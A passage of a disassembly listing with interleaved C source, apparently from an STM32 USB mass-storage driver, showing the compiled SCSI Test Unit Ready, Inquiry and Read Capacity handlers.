 8009b58:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b5c:	699b      	ldr	r3, [r3, #24]
 8009b5e:	2b00      	cmp	r3, #0
 8009b60:	d00b      	beq.n	8009b7a <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b62:	697b      	ldr	r3, [r7, #20]
 8009b64:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b68:	7f59      	ldrb	r1, [r3, #29]
 8009b6a:	2320      	movs	r3, #32
 8009b6c:	2205      	movs	r2, #5
 8009b6e:	68f8      	ldr	r0, [r7, #12]
 8009b70:	f000 fb86 	bl	800a280 <SCSI_SenseCode>

    return -1;
 8009b74:	f04f 33ff 	mov.w	r3, #4294967295
 8009b78:	e031      	b.n	8009bde <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009b7a:	697b      	ldr	r3, [r7, #20]
 8009b7c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b80:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009b84:	2b02      	cmp	r3, #2
 8009b86:	d10b      	bne.n	8009ba0 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b88:	7af9      	ldrb	r1, [r7, #11]
 8009b8a:	233a      	movs	r3, #58	; 0x3a
 8009b8c:	2202      	movs	r2, #2
 8009b8e:	68f8      	ldr	r0, [r7, #12]
 8009b90:	f000 fb76 	bl	800a280 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b94:	697b      	ldr	r3, [r7, #20]
 8009b96:	2205      	movs	r2, #5
 8009b98:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b9a:	f04f 33ff 	mov.w	r3, #4294967295
 8009b9e:	e01e      	b.n	8009bde <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009ba0:	68fb      	ldr	r3, [r7, #12]
 8009ba2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009ba6:	68fa      	ldr	r2, [r7, #12]
 8009ba8:	33b0      	adds	r3, #176	; 0xb0
 8009baa:	009b      	lsls	r3, r3, #2
 8009bac:	4413      	add	r3, r2
 8009bae:	685b      	ldr	r3, [r3, #4]
 8009bb0:	689b      	ldr	r3, [r3, #8]
 8009bb2:	7afa      	ldrb	r2, [r7, #11]
 8009bb4:	4610      	mov	r0, r2
 8009bb6:	4798      	blx	r3
 8009bb8:	4603      	mov	r3, r0
 8009bba:	2b00      	cmp	r3, #0
 8009bbc:	d00b      	beq.n	8009bd6 <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009bbe:	7af9      	ldrb	r1, [r7, #11]
 8009bc0:	233a      	movs	r3, #58	; 0x3a
 8009bc2:	2202      	movs	r2, #2
 8009bc4:	68f8      	ldr	r0, [r7, #12]
 8009bc6:	f000 fb5b 	bl	800a280 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009bca:	697b      	ldr	r3, [r7, #20]
 8009bcc:	2205      	movs	r2, #5
 8009bce:	721a      	strb	r2, [r3, #8]

    return -1;
 8009bd0:	f04f 33ff 	mov.w	r3, #4294967295
 8009bd4:	e003      	b.n	8009bde <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009bd6:	697b      	ldr	r3, [r7, #20]
 8009bd8:	2200      	movs	r2, #0
 8009bda:	60da      	str	r2, [r3, #12]

  return 0;
 8009bdc:	2300      	movs	r3, #0
}
 8009bde:	4618      	mov	r0, r3
 8009be0:	3718      	adds	r7, #24
 8009be2:	46bd      	mov	sp, r7
 8009be4:	bd80      	pop	{r7, pc}
	...

08009be8 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009be8:	b580      	push	{r7, lr}
 8009bea:	b088      	sub	sp, #32
 8009bec:	af00      	add	r7, sp, #0
 8009bee:	60f8      	str	r0, [r7, #12]
 8009bf0:	460b      	mov	r3, r1
 8009bf2:	607a      	str	r2, [r7, #4]
 8009bf4:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009bf6:	68fb      	ldr	r3, [r7, #12]
 8009bf8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009bfc:	68fb      	ldr	r3, [r7, #12]
 8009bfe:	32b0      	adds	r2, #176	; 0xb0
 8009c00:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009c04:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009c06:	69bb      	ldr	r3, [r7, #24]
 8009c08:	2b00      	cmp	r3, #0
 8009c0a:	d102      	bne.n	8009c12 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009c0c:	f04f 33ff 	mov.w	r3, #4294967295
 8009c10:	e062      	b.n	8009cd8 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009c12:	69bb      	ldr	r3, [r7, #24]
 8009c14:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c18:	699b      	ldr	r3, [r3, #24]
 8009c1a:	2b00      	cmp	r3, #0
 8009c1c:	d10b      	bne.n	8009c36 <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009c1e:	69bb      	ldr	r3, [r7, #24]
 8009c20:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c24:	7f59      	ldrb	r1, [r3, #29]
 8009c26:	2320      	movs	r3, #32
 8009c28:	2205      	movs	r2, #5
 8009c2a:	68f8      	ldr	r0, [r7, #12]
 8009c2c:	f000 fb28 	bl	800a280 <SCSI_SenseCode>
    return -1;
 8009c30:	f04f 33ff 	mov.w	r3, #4294967295
 8009c34:	e050      	b.n	8009cd8 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009c36:	687b      	ldr	r3, [r7, #4]
 8009c38:	3301      	adds	r3, #1
 8009c3a:	781b      	ldrb	r3, [r3, #0]
 8009c3c:	f003 0301 	and.w	r3, r3, #1
 8009c40:	2b00      	cmp	r3, #0
 8009c42:	d021      	beq.n	8009c88 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009c44:	687b      	ldr	r3, [r7, #4]
 8009c46:	3302      	adds	r3, #2
 8009c48:	781b      	ldrb	r3, [r3, #0]
 8009c4a:	2b00      	cmp	r3, #0
 8009c4c:	d105      	bne.n	8009c5a <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009c4e:	2206      	movs	r2, #6
 8009c50:	4923      	ldr	r1, [pc, #140]	; (8009ce0 <SCSI_Inquiry+0xf8>)
 8009c52:	69b8      	ldr	r0, [r7, #24]
 8009c54:	f001 f8fa 	bl	800ae4c <SCSI_UpdateBotData>
 8009c58:	e03d      	b.n	8009cd6 <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009c5a:	687b      	ldr	r3, [r7, #4]
 8009c5c:	3302      	adds	r3, #2
 8009c5e:	781b      	ldrb	r3, [r3, #0]
 8009c60:	2b80      	cmp	r3, #128	; 0x80
 8009c62:	d105      	bne.n	8009c70 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009c64:	2208      	movs	r2, #8
 8009c66:	491f      	ldr	r1, [pc, #124]	; (8009ce4 <SCSI_Inquiry+0xfc>)
 8009c68:	69b8      	ldr	r0, [r7, #24]
 8009c6a:	f001 f8ef 	bl	800ae4c <SCSI_UpdateBotData>
 8009c6e:	e032      	b.n	8009cd6 <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009c70:	69bb      	ldr	r3, [r7, #24]
 8009c72:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c76:	7f59      	ldrb	r1, [r3, #29]
 8009c78:	2324      	movs	r3, #36	; 0x24
 8009c7a:	2205      	movs	r2, #5
 8009c7c:	68f8      	ldr	r0, [r7, #12]
 8009c7e:	f000 faff 	bl	800a280 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009c82:	f04f 33ff 	mov.w	r3, #4294967295
 8009c86:	e027      	b.n	8009cd8 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c88:	68fb      	ldr	r3, [r7, #12]
 8009c8a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c8e:	68fa      	ldr	r2, [r7, #12]
 8009c90:	33b0      	adds	r3, #176	; 0xb0
 8009c92:	009b      	lsls	r3, r3, #2
 8009c94:	4413      	add	r3, r2
 8009c96:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c98:	69d9      	ldr	r1, [r3, #28]
 8009c9a:	7afa      	ldrb	r2, [r7, #11]
 8009c9c:	4613      	mov	r3, r2
 8009c9e:	00db      	lsls	r3, r3, #3
 8009ca0:	4413      	add	r3, r2
 8009ca2:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009ca4:	440b      	add	r3, r1
 8009ca6:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009ca8:	697b      	ldr	r3, [r7, #20]
 8009caa:	3304      	adds	r3, #4
 8009cac:	781b      	ldrb	r3, [r3, #0]
 8009cae:	b29b      	uxth	r3, r3
 8009cb0:	3305      	adds	r3, #5
 8009cb2:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009cb4:	687b      	ldr	r3, [r7, #4]
 8009cb6:	3304      	adds	r3, #4
 8009cb8:	781b      	ldrb	r3, [r3, #0]
 8009cba:	b29b      	uxth	r3, r3
 8009cbc:	8bfa      	ldrh	r2, [r7, #30]
 8009cbe:	429a      	cmp	r2, r3
 8009cc0:	d303      	bcc.n	8009cca <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009cc2:	687b      	ldr	r3, [r7, #4]
 8009cc4:	3304      	adds	r3, #4
 8009cc6:	781b      	ldrb	r3, [r3, #0]
 8009cc8:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009cca:	8bfb      	ldrh	r3, [r7, #30]
 8009ccc:	461a      	mov	r2, r3
 8009cce:	6979      	ldr	r1, [r7, #20]
 8009cd0:	69b8      	ldr	r0, [r7, #24]
 8009cd2:	f001 f8bb 	bl	800ae4c <SCSI_UpdateBotData>
  }

  return 0;
 8009cd6:	2300      	movs	r3, #0
}
 8009cd8:	4618      	mov	r0, r3
 8009cda:	3720      	adds	r7, #32
 8009cdc:	46bd      	mov	sp, r7
 8009cde:	bd80      	pop	{r7, pc}
 8009ce0:	2000010c 	.word	0x2000010c
 8009ce4:	20000114 	.word	0x20000114

08009ce8 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ce8:	b590      	push	{r4, r7, lr}
 8009cea:	b087      	sub	sp, #28
 8009cec:	af00      	add	r7, sp, #0
 8009cee:	60f8      	str	r0, [r7, #12]
 8009cf0:	460b      	mov	r3, r1
 8009cf2:	607a      	str	r2, [r7, #4]
 8009cf4:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009cf6:	68fb      	ldr	r3, [r7, #12]
 8009cf8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009cfc:	68fb      	ldr	r3, [r7, #12]
 8009cfe:	32b0      	adds	r2, #176	; 0xb0
 8009d00:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d04:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009d06:	697b      	ldr	r3, [r7, #20]
 8009d08:	2b00      	cmp	r3, #0
 8009d0a:	d102      	bne.n	8009d12 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009d0c:	f04f 33ff 	mov.w	r3, #4294967295
 8009d10:	e075      	b.n	8009dfe <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009d12:	68fb      	ldr	r3, [r7, #12]
 8009d14:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d18:	68fa      	ldr	r2, [r7, #12]
 8009d1a:	33b0      	adds	r3, #176	; 0xb0
 8009d1c:	009b      	lsls	r3, r3, #2
 8009d1e:	4413      	add	r3, r2
 8009d20:	685b      	ldr	r3, [r3, #4]
 8009d22:	685c      	ldr	r4, [r3, #4]
 8009d24:	697b      	ldr	r3, [r7, #20]
 8009d26:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009d2a:	3308      	adds	r3, #8
 8009d2c:	697a      	ldr	r2, [r7, #20]
 8009d2e:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009d32:	3204      	adds	r2, #4
 8009d34:	7af8      	ldrb	r0, [r7, #11]
 8009d36:	4619      	mov	r1, r3
 8009d38:	47a0      	blx	r4
 8009d3a:	4603      	mov	r3, r0
 8009d3c:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009d3e:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009d42:	2b00      	cmp	r3, #0
 8009d44:	d106      	bne.n	8009d54 <SCSI_ReadCapacity10+0x6c>
 8009d46:	697b      	ldr	r3, [r7, #20]
 8009d48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d4c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009d50:	2b02      	cmp	r3, #2
 8009d52:	d108      	bne.n	8009d66 <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d54:	7af9      	ldrb	r1, [r7, #11]
 8009d56:	233a      	movs	r3, #58	; 0x3a
 8009d58:	2202      	movs	r2, #2
 8009d5a:	68f8      	ldr	r0, [r7, #12]
 8009d5c:	f000 fa90 	bl	800a280 <SCSI_SenseCode>
    return -1;
 8009d60:	f04f 33ff 	mov.w	r3, #4294967295
 8009d64:	e04b      	b.n	8009dfe <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009d66:	697b      	ldr	r3, [r7, #20]
 8009d68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d6c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d6e:	3b01      	subs	r3, #1
 8009d70:	0e1b      	lsrs	r3, r3, #24
 8009d72:	b2da      	uxtb	r2, r3
 8009d74:	697b      	ldr	r3, [r7, #20]
 8009d76:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009d78:	697b      	ldr	r3, [r7, #20]
 8009d7a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d7e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d80:	3b01      	subs	r3, #1
 8009d82:	0c1b      	lsrs	r3, r3, #16
 8009d84:	b2da      	uxtb	r2, r3
 8009d86:	697b      	ldr	r3, [r7, #20]
 8009d88:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d8a:	697b      	ldr	r3, [r7, #20]
 8009d8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d90:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d92:	3b01      	subs	r3, #1
 8009d94:	0a1b      	lsrs	r3, r3, #8
 8009d96:	b2da      	uxtb	r2, r3
 8009d98:	697b      	ldr	r3, [r7, #20]
 8009d9a:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009d9c:	697b      	ldr	r3, [r7, #20]
 8009d9e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009da2:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009da4:	b2db      	uxtb	r3, r3
 8009da6:	3b01      	subs	r3, #1
 8009da8:	b2da      	uxtb	r2, r3
 8009daa:	697b      	ldr	r3, [r7, #20]
 8009dac:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009dae:	697b      	ldr	r3, [r7, #20]
 8009db0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009db4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009db8:	161b      	asrs	r3, r3, #24
 8009dba:	b2da      	uxtb	r2, r3
 8009dbc:	697b      	ldr	r3, [r7, #20]
 8009dbe:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009dc0:	697b      	ldr	r3, [r7, #20]
 8009dc2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dc6:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009dca:	141b      	asrs	r3, r3, #16
 8009dcc:	b2da      	uxtb	r2, r3
 8009dce:	697b      	ldr	r3, [r7, #20]
 8009dd0:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009dd2:	697b      	ldr	r3, [r7, #20]
 8009dd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dd8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ddc:	0a1b      	lsrs	r3, r3, #8
 8009dde:	b29b      	uxth	r3, r3
 8009de0:	b2da      	uxtb	r2, r3
 8009de2:	697b      	ldr	r3, [r7, #20]
 8009de4:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009de6:	697b      	ldr	r3, [r7, #20]
 8009de8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dec:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009df0:	b2da      	uxtb	r2, r3
 8009df2:	697b      	ldr	r3, [r7, #20]
 8009df4:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009df6:	697b      	ldr	r3, [r7, #20]
 8009df8:	2208      	movs	r2, #8
 8009dfa:	60da      	str	r2, [r3, #12]

  return 0;
 8009dfc:	2300      	movs	r3, #0

}
 8009dfe:	4618      	mov	r0, r3
 8009e00:	371c      	adds	r7, #28
 8009e02:	46bd      	mov	sp, r7
 8009e04:	bd90      	pop	{r4, r7, pc}

08009e06 <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e06:	b590      	push	{r4, r7, lr}
 8009e08:	b089      	sub	sp, #36	; 0x24
 8009e0a:	af00      	add	r7, sp, #0
 8009e0c:	60f8      	str	r0, [r7, #12]
 8009e0e:	460b      	mov	r3, r1
 8009e10:	607a      	str	r2, [r7, #4]
 8009e12:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e14:	68fb      	ldr	r3, [r7, #12]
 8009e16:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e1a:	68fb      	ldr	r3, [r7, #12]
 8009e1c:	32b0      	adds	r2, #176	; 0xb0
 8009e1e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009e22:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009e24:	69bb      	ldr	r3, [r7, #24]
 8009e26:	2b00      	cmp	r3, #0
 8009e28:	d102      	bne.n	8009e30 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009e2a:	f04f 33ff 	mov.w	r3, #4294967295
 8009e2e:	e0ab      	b.n	8009f88 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009e30:	68fb      	ldr	r3, [r7, #12]
 8009e32:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e36:	68fa      	ldr	r2, [r7, #12]
 8009e38:	33b0      	adds	r3, #176	; 0xb0
 8009e3a:	009b      	lsls	r3, r3, #2
 8009e3c:	4413      	add	r3, r2
 8009e3e:	685b      	ldr	r3, [r3, #4]
 8009e40:	685c      	ldr	r4, [r3, #4]
 8009e42:	69bb      	ldr	r3, [r7, #24]
 8009e44:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009e48:	3308      	adds	r3, #8
 8009e4a:	69ba      	ldr	r2, [r7, #24]
 8009e4c:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009e50:	3204      	adds	r2, #4
 8009e52:	7af8      	ldrb	r0, [r7, #11]
 8009e54:	4619      	mov	r1, r3
 8009e56:	47a0      	blx	r4
 8009e58:	4603      	mov	r3, r0
 8009e5a:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009e5c:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009e60:	2b00      	cmp	r3, #0
 8009e62:	d106      	bne.n	8009e72 <SCSI_ReadCapacity16+0x6c>
 8009e64:	69bb      	ldr	r3, [r7, #24]
 8009e66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e6a:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009e6e:	2b02      	cmp	r3, #2
 8009e70:	d108      	bne.n	8009e84 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009e72:	7af9      	ldrb	r1, [r7, #11]
 8009e74:	233a      	movs	r3, #58	; 0x3a
 8009e76:	2202      	movs	r2, #2
 8009e78:	68f8      	ldr	r0, [r7, #12]
 8009e7a:	f000 fa01 	bl	800a280 <SCSI_SenseCode>
    return -1;
 8009e7e:	f04f 33ff 	mov.w	r3, #4294967295
 8009e82:	e081      	b.n	8009f88 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e84:	687b      	ldr	r3, [r7, #4]
 8009e86:	330a      	adds	r3, #10
 8009e88:	781b      	ldrb	r3, [r3, #0]
 8009e8a:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e8c:	687b      	ldr	r3, [r7, #4]
 8009e8e:	330b      	adds	r3, #11
 8009e90:	781b      	ldrb	r3, [r3, #0]
 8009e92:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e94:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e96:	687b      	ldr	r3, [r7, #4]
 8009e98:	330c      	adds	r3, #12
 8009e9a:	781b      	ldrb	r3, [r3, #0]
 8009e9c:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e9e:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009ea0:	687a      	ldr	r2, [r7, #4]
 8009ea2:	320d      	adds	r2, #13
 8009ea4:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009ea6:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ea8:	69bb      	ldr	r3, [r7, #24]
 8009eaa:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009eac:	2300      	movs	r3, #0
 8009eae:	61fb      	str	r3, [r7, #28]
 8009eb0:	e008      	b.n	8009ec4 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009eb2:	69ba      	ldr	r2, [r7, #24]
 8009eb4:	69fb      	ldr	r3, [r7, #28]
 8009eb6:	4413      	add	r3, r2
 8009eb8:	3310      	adds	r3, #16
 8009eba:	2200      	movs	r2, #0
 8009ebc:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009ebe:	69fb      	ldr	r3, [r7, #28]
 8009ec0:	3301      	adds	r3, #1
 8009ec2:	61fb      	str	r3, [r7, #28]
 8009ec4:	69bb      	ldr	r3, [r7, #24]
 8009ec6:	68db      	ldr	r3, [r3, #12]
 8009ec8:	69fa      	ldr	r2, [r7, #28]
 8009eca:	429a      	cmp	r2, r3
 8009ecc:	d3f1      	bcc.n	8009eb2 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009ece:	69bb      	ldr	r3, [r7, #24]
 8009ed0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ed4:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ed6:	3b01      	subs	r3, #1
 8009ed8:	0e1b      	lsrs	r3, r3, #24
 8009eda:	b2da      	uxtb	r2, r3
 8009edc:	69bb      	ldr	r3, [r7, #24]
 8009ede:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009ee0:	69bb      	ldr	r3, [r7, #24]
 8009ee2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ee6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ee8:	3b01      	subs	r3, #1
 8009eea:	0c1b      	lsrs	r3, r3, #16
 8009eec:	b2da      	uxtb	r2, r3
 8009eee:	69bb      	ldr	r3, [r7, #24]
 8009ef0:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009ef2:	69bb      	ldr	r3, [r7, #24]
 8009ef4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ef8:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009efa:	3b01      	subs	r3, #1
 8009efc:	0a1b      	lsrs	r3, r3, #8
 8009efe:	b2da      	uxtb	r2, r3
 8009f00:	69bb      	ldr	r3, [r7, #24]
 8009f02:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009f04:	69bb      	ldr	r3, [r7, #24]
 8009f06:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f0a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f0c:	b2db      	uxtb	r3, r3
 8009f0e:	3b01      	subs	r3, #1
 8009f10:	b2da      	uxtb	r2, r3
 8009f12:	69bb      	ldr	r3, [r7, #24]
 8009f14:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009f16:	69bb      	ldr	r3, [r7, #24]
 8009f18:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f1c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f20:	161b      	asrs	r3, r3, #24
 8009f22:	b2da      	uxtb	r2, r3
 8009f24:	69bb      	ldr	r3, [r7, #24]
 8009f26:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009f28:	69bb      	ldr	r3, [r7, #24]
 8009f2a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f2e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f32:	141b      	asrs	r3, r3, #16
 8009f34:	b2da      	uxtb	r2, r3
 8009f36:	69bb      	ldr	r3, [r7, #24]
 8009f38:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009f3a:	69bb      	ldr	r3, [r7, #24]
 8009f3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
